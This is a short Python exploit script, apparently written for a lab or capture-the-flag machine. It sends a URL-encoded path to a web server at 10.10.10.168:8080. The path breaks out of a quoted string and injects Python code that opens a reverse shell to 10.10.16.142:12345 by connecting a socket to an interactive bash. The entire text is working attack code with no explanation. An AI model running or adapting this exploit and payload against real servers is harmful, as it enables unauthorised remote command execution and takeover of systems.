import requests
import urllib
import os

url = 'http://10.10.10.168:8080/'

path = '5\''+'\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.142",12345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash", "-i"])\na=\''

payload = urllib.parse.quote(path)
print("payload")
print(url+payload)

r = requests.get(url+payload)
print(r.headers)
print(r.text)
